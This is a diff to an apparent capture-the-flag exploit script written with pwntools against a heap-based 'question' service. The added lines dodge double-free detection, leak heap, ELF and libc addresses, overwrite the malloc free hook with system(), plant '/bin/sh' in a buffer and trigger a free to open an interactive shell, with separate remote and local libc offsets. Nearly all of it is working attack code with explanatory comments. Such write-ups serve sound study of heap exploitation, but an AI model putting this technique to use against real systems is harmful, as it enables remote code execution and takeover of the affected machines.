@@ -69,10 +69,10 @@ start()
 create()
 create()
 destroy(1)
+create()   # Prevents double-free detection
 destroy(1)
 create()
 
-#
 heap_addr = u32(ask(2)[:4])
 
 # Sets back pointer of 1 to itself, so when allocating a question, you allocate the same chunk twice
@@ -83,12 +83,21 @@ elf.address = u32(ask(3)[:4]) - elf.symbols["print_question"]
 # Fix up the question pointer to correctly point at the question
 set_memory(heap_addr + 0x20)
 
-libc_base = read_memory(elf.got["puts"]) - 0x67b40  # - 0x67c10
-system    = libc_base + 0x03d200                    # + 0x3d250
-free_hook = libc_base + 0x1d98d0                    # + 0x1d98d0
+if args.REMOTE:
+    libc_base = read_memory(elf.got["puts"]) - 0x67b40
+    system    = libc_base + 0x03d200
+    free_hook = libc_base + 0x1d98d0
+else:
+    libc_base = read_memory(elf.got["puts"])- 0x67c10
+    system    = libc_base + 0x3d250
+    free_hook = libc_base + 0x1d98d0
 
+# Overwrite the malloc free hook with a pointer to system(), so when the program attempts to free the question, instead call system() on the question
 write_memory(free_hook, p32(system))
+# Overwrite the question with a pointer to bin/sh, so instead of calling system() on the question, it calls system('bin/sh')
 set(0, "/bin/sh\x00")
+
+delete(0)
 
 p.interactive()
 p.close()
